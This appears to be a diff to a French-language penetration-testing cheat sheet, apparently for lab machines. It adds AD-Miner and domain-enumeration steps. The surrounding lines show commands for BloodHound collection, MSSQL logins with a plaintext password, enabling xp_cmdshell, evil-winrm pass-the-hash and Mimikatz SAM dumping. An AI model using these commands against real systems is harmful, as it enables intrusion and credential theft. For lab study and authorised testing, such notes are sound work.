@@ -393,7 +393,8 @@ allow-hotplug eth0
   	3. On lance le collecteur --> `.\sharphound.exe `
   	4. On récupère le zip --> `download 20230907051940_BloodHound.zip`
   	5. On lance `neo4j console` et `bloodhound` (si 1ère connexion changer mot de passe via interface web `localhost:7687`)
-  	6. On importe le zip dans l'interface graphique 
+  	6. On importe le zip dans l'interface graphique
+  	7. Nous pouvons compléter l'analyse avec [AD-Miner](https://github.com/AD-Security/AD_Miner), pour trouver d'autre chemin d'attaque
 
 - Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth` ou `impacket-mssqlclient sa:x5Chuz8XbM@10.10.110.58`
   	- Activer le `xp_cmdshell` --> `enable_xp_cmdshell` ou ⬇️ 
@@ -420,6 +421,8 @@ SQL (sophie  dbo@master)> EXEC xp_cmdshell 'whoami';
   	- Avec hash --> `evil-winrm -u 'Administrator' -H 'f223277b637be474af366a652b9abb06' -i 10.10.110.3`
 
 - Avoir les informations sur l'utillisateur Windows --> `net user` ou `whoami /priv`
+  	- Récupérer plus d'informations --> `net user MONUSER /domain`
+  	- Connaître les membres d'un groupe --> `net group IT /domain`
 
 - Mimikatz --> `mimikatz # lsadump::sam`
 
